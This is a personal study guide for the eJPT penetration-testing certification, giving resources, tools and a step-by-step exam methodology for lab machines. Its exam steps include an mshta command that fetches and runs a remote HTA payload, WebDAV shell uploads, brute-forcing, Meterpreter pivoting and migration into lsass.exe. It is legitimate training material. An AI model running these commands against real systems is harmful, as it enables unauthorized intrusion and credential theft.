## How I Prepared for eJPT and My Top Tips to Pass
### About Me:

My name is Md. Rabius Sany. I am a Cybersecurity Enthusiast, a CSE student, and ranked in the Top 2% on TryHackMe. I began my journey into cybersecurity in 2023, and since then, I have been deeply passionate about learning more in this ever-evolving field. Recently, I successfully passed the eJPT certification exam in just 13 hours with a 94% score! This article is part one of my two-part series detailing my experience.

### Series Overview:

📌 **Part 1:** [Passing eJPT in 13 Hours with a 94% Score!: My Exam Day Experience & Structure](https://github.com/sany4sec/eJPT-by-sany4sec/blob/main/My-Exam-Day-Experience-(Part%201).md)

📌 **Part 2:** How I Prepared for eJPT and My Top Tips to Pass

This is the second part. I hope you will find it useful.

---

**Table of Contents:**

1. Pre-eJPT Preparation  
2. eJPT Exam Preparation  
3. Tools You Have to Master  
4. Practice on Some TryHackMe Rooms  
5. What to Do During the Exam  

---

## 1. Pre-eJPT Preparation:

Before you take the eJPT exam or training, you should have a good understanding of computer fundamentals, Linux, and networking. I will provide some resources where you can learn these basics. If you already have knowledge of these topics, you can revise them or skip this section.

- **Linux:** [Linux For Hackers (Free)](https://youtube.com/playlist?list=PLIhvC56v63IJIujb5cyE13oLuyORZpdkL&si=8CvMHrlJHggEImj3)  
- **Networking:** [Networking Course (Free)](https://youtube.com/playlist?list=PLIhvC56v63IJVXv0GJcl9vO5Z6znCVb1P&si=pqoPNHeCFKizQPgZ)  

---

## 2. eJPT Exam Preparation:

This is the section we’ve been waiting for.  
First of all, when you purchase an eJPT voucher, they provide three months of training along with it. The training is sufficient for this certification. However, for proper preparation, I have some advice to follow:

### 1. Note-Taking:
Note-taking is a must. You need to take good notes on what you are learning. I recommend using the Cherry Tree note-taking app. It is offline and performs fast.  
If you are using Cherry Tree, make sure to back up your notes regularly. Since it is stored locally, if your system crashes, you will lose all your notes.  
I will share a great GitHub repository for notes: [EJPTv2 Notes](https://github.com/neilmadhava/EJPTv2-Notes.git).

### 2. Complete the Full Training:
The training “Penetration Testing Student” that comes with eJPT is enough for this certification. The course teaches everything a junior penetration tester needs to know. You will gain a solid understanding of penetration testing trends and methodologies. Each section comes with a practical lab environment where you can learn hands-on penetration testing.  
If you cannot complete the training, that’s perfectly fine. You can complete the Junior Penetration Tester path on TryHackMe.  
[Junior Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester).

### 3. Master All Enumeration Techniques:
Master all enumeration techniques taught in the Penetration Testing Student course. Most of the exam questions are enumeration-based. Take detailed notes on each enumeration technique so you can use them during the exam. Some important protocols to focus on include FTP, SSH, HTTP, HTTPS, WebDAV, RDP, SMB, WinRM, and MySQL. You will likely not encounter other protocols.

### 4. Brute Forcing Techniques:
You will need to perform a lot of brute-forcing during the exam. Familiarize yourself with brute-forcing tools like Hydra, Burp Suite Intruder, Metasploit login brute-force modules, WPScan brute-force, and login page brute-forcing. These will help you gain access to systems.

### 5. Hash Cracking:
You may encounter scenarios where you need to crack NTLM, SHA512, MD5, or other hashes, or identify the hash type. Master tools like John the Ripper, Hashcat, and online hash-cracking tools such as:  
- [CrackStation](https://crackstation.net/)  
- [Hash Identifier](https://hashes.com/en/tools/hash_identifier)  
- [MD5 Hashing](https://md5hashing.net/) (This tool is very useful for CTFs and eJPT).

### 6. Gaining Access with Shells:
You need a clear understanding of how reverse/bind shells work and how to gain access using them. Sometimes, you will need to modify and provide your IP and port in these shells.  
Some resources for reverse/bind shells:  
1. [Pentester Monkey](https://pentestmonkey.net/)  
2. [Reverse Shell Generator](https://www.revshells.com/)  
3. `/usr/share/webshell/`  
4. Msfvenom  

### 7. Privilege Escalation:
You need to know both Windows and Linux privilege escalation techniques to pass the exam. Familiarize yourself with the online resource “GTFOBins.” I will share some notes you can use during the eJPT exam:  
- [Linux Privilege Escalation](https://github.com/Ignitetechnologies/Linux-Privilege-Escalation.git)  
- [Windows Privilege Escalation](https://github.com/neilmadhava/EJPTv2-Notes/blob/main/Post-Exploitation/win-privesc.md)  
- [GTFOBins](https://gtfobins.github.io/)  

### 8. Internal Network Penetration Testing:
In the eJPT exam, you will encounter questions related to internal network machines. You need to learn:  
1. How to find an internal network after gaining access to a machine.  
2. How to add an autoroute with Meterpreter.  
3. How to perform port forwarding to scan the internal network with Nmap.  

### 9. Transferring Files:
To pass the eJPT exam, you must know how to transfer files to and from the target. You need to know:  
1. Transferring files to a Windows target.  
2. Transferring files to a Linux target.  

### 10. Web Enumeration and Attacks:
The eJPT exam covers some basic web attacks. You need to know about:  
1. Web enumeration.  
2. Directory brute-forcing.  
3. Adding hosts & domains to the attacker’s `/etc/hosts` file.  
4. Login brute-forcing.  
5. Familiarity with tools like Burp Suite, ZAP, sqlmap, Nikto, and WPScan.  

---

## 3. Tools You Have to Master:

In this section, I will list some tools you must master before taking the eJPT exam. If you don’t master these, you will not pass the exam easily.

1. **Nmap:**  
   This is a powerful and most-used tool for the eJPT exam. You must master Nmap to pass the exam.

2. **Metasploit Framework:**  
   This is the second most useful tool for the eJPT exam. The Penetration Testing Student course covers many Metasploit modules in various phases of the penetration testing cycle. You must master this tool to pass the exam and grow your career in cybersecurity.
3. **Netcat (nc) –**
    A versatile networking tool used for reading and writing data across network connections. It can be used for **port scanning, banner grabbing, file transfers, reverse shells, and creating backdoors.** Netcat is a must-have tool for penetration testers and system administrators.
4. **Meterpreter and Msfvenom:**  
   Although Meterpreter and Msfvenom are part of the Metasploit Framework, I want to emphasize their importance. It is crucial to learn and use Meterpreter during the exam. When you get a shell, it will likely be a Meterpreter shell.  
   Msfvenom is used to generate shells that can be used with the Metasploit Framework’s “multi-handler” module.

5. **FTP, SSH, SMBClient, xfreerdp:**  
   These tools will help you establish sessions or anonymous sessions on specific protocols.  
   - **FTP:** You can create an FTP session anonymously or with credentials to find important files, upload, or download files.  
   - **SSH:** This will help you log in to Windows or Linux machines after finding credentials.  
   - **SMBClient:** This will help you establish a session on SMB ports and enumerate shares, interesting files, and directories, as well as upload and download files.  
   - **xfreerdp:** This will help you establish a remote connection to a Windows machine when RDP is enabled.

6. **Hydra:**  
   Hydra is a useful tool for brute-forcing FTP, SSH, RDP, SMB, and HTTP logins. This tool will be helpful during the exam.

7. **John the Ripper and Hashcat:**  
   These tools are used to crack hashes for Linux or Windows machines. You must master one of these tools to pass the exam.

8. **WPScan:**  
   A great tool for when you encounter a WordPress site. You can perform WordPress login brute-forcing, user enumeration, plugin enumeration, and theme enumeration with this tool.

9. **Nikto:**  
   This is another web-related tool. It is a web vulnerability scanner that will find interesting information about the target web server. It is easy to use and powerful.

10. **Dirb, Dirbuster, Gobuster:**  
   These are directory-busting tools. You must master one of these tools, especially Dirb, to find hidden directories on your target web server. This is common in CTFs and certification exams, where you need to find hidden directories that reveal important information or files.

11. **CrackMapExec and PsExec:**  
    These tools help you gain access to systems using SMB credentials. You will likely encounter this scenario during the eJPT exam.

12. **Wordlists:**  
    There are four important wordlists that are sufficient for the eJPT exam:  
    1. Usernames: `/usr/share/metasploit-framework/data/wordlists/unix_users.txt`  
    2. Passwords: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`  
    3. Rockyou: `/usr/share/wordlists/rockyou.txt`  
    4. Directory brute-forcing: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`  



---

## **4. Practice on Some TryHackMe Rooms**  
After finishing the eJPT course and mastering the essential tools, it’s time to practice some free CTF challenges on TryHackMe before taking the eJPT exam. This will help you develop the mindset needed to find flags or exploit vulnerabilities on your target. If you get stuck on a room, make sure to read the write-ups for that room.  

Here are some free TryHackMe rooms I’ve solved:  
1. [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)  
2. [RootMe](https://tryhackme.com/room/rrootme)  
3. [Easy CTF](https://tryhackme.com/room/easyctf)  
4. [Ignite](https://tryhackme.com/room/ignite)  
5. [Startup](https://tryhackme.com/room/startup)  
6. [Blog](https://tryhackme.com/room/blog)  
7. [FFUF](https://tryhackme.com/room/ffuf)  
8. [Hackernote](https://tryhackme.com/room/hackernote)  
9. [Ice](https://tryhackme.com/room/ice)  
10. [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)  
11. [Anonymous](https://tryhackme.com/room/anonymous)  
12. [Easy Peasy CTF](https://tryhackme.com/room/easypeasyctf)  
13. [GoldenEye](https://tryhackme.com/room/goldeneye)  
14. [Joker CTF](https://tryhackme.com/room/jokerctf)  
15. [Bolt](https://tryhackme.com/room/bolt)  
16. [Deja Vu](https://tryhackme.com/room/dejavu)  
17. [Source](https://tryhackme.com/room/source)  
18. [Poster](https://tryhackme.com/room/poster)  
19. [Pickle Rick](https://tryhackme.com/room/picklerick)  
20. [Overpass](https://tryhackme.com/room/overpass)  
21. [Vulnversity](https://tryhackme.com/room/vulnversity)  
22. [WordPress CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447)  
23. [Ra](https://tryhackme.com/room/ra)  
24. [Brute Force Heroes](https://tryhackme.com/room/bruteforceheroes)  
25. [H4cked](https://tryhackme.com/room/h4cked)  

I believe these rooms will be enough to build your eJPT CTF mindset. Now, let’s move on to exam day.  

---

## **5. What to Do During the Exam**  
When you start the exam, you’ll need to follow some tips and tricks to complete all the machines. Here’s a guide to help you:  

### **Step 0: Save All 35 Questions in CherryTree**  
- Start the exam and save all 35 questions in your CherryTree notes.  
- After discovering all the targets, categorize the questions by machine.  

### **Step 1: Perform a Host Discovery Scan with Nmap**  
Run the following command to find all live hosts on your subnet:  
```bash
nmap -sn 192.168.0.5/24 | grep "report for" | awk -F '[()]' '{print $2}' > livehosts.txt
```  
This will save the live hosts to a text file, including your IP and gateway. Remove your IP and gateway from the file to avoid scanning your own machine. In my exam, there were 6 target machines.  

### **Step 2: Perform a Full TCP Port Scan**  
Run a full TCP port scan using the following command:  
```bash
nmap -iL livehosts.txt -p- -T5
```  
This will identify open ports on all targets. Save this information for each live host.  

### **Step 3: Perform an Aggressive Scan on Each Target**  
Now that you’ve identified open ports, perform an aggressive scan on each target separately. For example, if the first machine has ports 21, 80, and 3389 open, run:  
```bash
nmap 192.168.0.51 -p 21,80,3389 -A
```  
This will provide detailed information about the target. Perform this scan for each machine and save the results in your notes. This information will help you answer questions and categorize them by target.  

### **Step 4: Note NetBIOS Names**  
Questions are based on NetBIOS names, not IP addresses. Save the NetBIOS name alongside the IP address in your notes, like this:  
```
51 - WINSERVER01
```  

### **Step 5: Map Questions to Machines**  
With all the information gathered, categorize the questions by specific targets. This will help you answer questions more effectively.  

### **Step 6: Perform Targeted Enumeration**  
Only perform the enumeration techniques required by the questions. Avoid random enumeration unless you’re stuck. For example, if a question asks for the web server version, focus on web enumeration rather than MySQL.  

### **Step 7: Check for Anonymous Access to FTP/SMB**  
- Enumerate whether the target allows anonymous or guest access to FTP and SMB ports.  
- Use tools like `smbclient` or `enum4linux` to access shares, users, and groups.  

### **Step 8: HTTP Enumeration**  
- Check for web servers on common ports (e.g., 80, 443) or uncommon ports (e.g., 8000, 8080).  
- Look for `/robots.txt`, `/sitemap.xml`, and hidden directories using tools like `dirb` or `gobuster`.  
- Use `wp-scan` and `nikto` to find plugins, users, and themes.  

### **Step 9: Exploit WebShells**  
If you find a web shell, use the following Metasploit module:  
```bash
exploit/windows/misc/hta_server
```  
Then execute the payload on the web shell:  
```bash
mshta.exe http://10.0.2.15:8080/bvp3U9De6.hta
```  

### **Step 10: Enumerate WebDAV**  
If WebDAV is enabled, check for directory listing using `davtest`:  
```bash
davtest -auth bob:password_123321 -url http://192.168.0.51/webdav
```  
If file uploads are supported, generate a shell with `msfvenom` and upload it using the following Metasploit module:  
```bash
exploit/windows/iis/iis_webdav_upload_asp
```  

### **Step 11: Brute-Force Attacks**  
If you find any users during FTP or SMB enumeration, perform brute-force attacks on every possible protocol:  
1. FTP brute-force  
2. SSH brute-force  
3. SMB brute-force  
4. RDP brute-force  
5. Web login brute-force  

Use the password lists provided in the exam or the wordlists mentioned earlier.  

### **Step 12: Use Credentials Wisely**  
If you find credentials (e.g., FTP, SMB, or web login), use them to access SMB, SSH, or RDP sessions. For example, I found FTP credentials that allowed me to gain RDP access to the target.  

### **Step 13: Check Service Versions for Vulnerabilities**  
If you find a service version during enumeration:  
1. Use `searchsploit` to check for vulnerabilities.  
2. Search Metasploit for relevant exploits.  
3. Search Google for publicly available exploits.  

### **Step 14: Upgrade Non-Interactive Shells**  
If you get a non-interactive shell (e.g., PHP or Python shell), upgrade it to an interactive Meterpreter session:  
```bash
sessions -u <session-id>
```  

### **Step 15: Post-Exploitation Tasks**  
After gaining access to a target:  
1. Answer the questions related to that target.  
2. Look for dynamic flags.  
3. Check for internal networks.  

### **Step 16: Pivot to Internal Networks**  
If you find an internal network:  
1. Use Meterpreter to set up an autoroute:  
   ```bash
   run autoroute -s <subnet>
   ```  
2. Use Metasploit’s TCP port scan module to find open ports:  
   ```bash
   auxiliary/scanner/portscan/tcp
   ```  

### **Step 17: Port Forwarding**  
To scan the internal network with Nmap, set up port forwarding:  
```bash
portfwd add -l 1234 -p 80 -r 10.0.29.96
```  
Then scan the forwarded port:  
```bash
nmap -A -p 1234 127.0.0.1
```  

### **Step 18: Migrate to LSASS in Meterpreter**  
If you gain access to a Windows system via Meterpreter, migrate to the `lsass.exe` process:  
```bash
migrate -N lsass.exe
```  

### **Step 19: If You Get Stuck**  
If you’re stuck:  
1. Take a break.  
2. Search for write-ups on similar lab environments.  
3. Refer to your notes or online resources.  

---

## **Resources**  
- [eJPTv2 Notes](https://github.com/neilmadhava/EJPTv2-Notes)  
- [Linux for Hackers](https://example.com/linux-course)  
- [Networking Basics](https://example.com/networking-course)  
- [Junior Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester)  
- [Hash Cracker](https://md5hashing.net/)  
- [GTFOBins](https://gtfobins.github.io/)  

---

By following this guide, you’ll be well-prepared to pass the eJPT exam. Thank you for reading!  

**MD Rabius Sany**  
Signing off.  
## **🎥 Video & Social Links**
📽 **Exam Submission Video:** [Watch Here](https://youtube.com/shorts/Oes333UiQKc)  
🔗 **TryHackMe:** [My Profile](https://tryhackme.com/r/p/sany4sec)  
🔗 **LinkedIn:** [Connect with Me](https://www.linkedin.com/in/sany4sec/)  
🔗 **Twitter (X):** [Follow Me](https://x.com/sany4sec)
🔗 **Website:** [sany4sec](http://sany4sec.super.site)
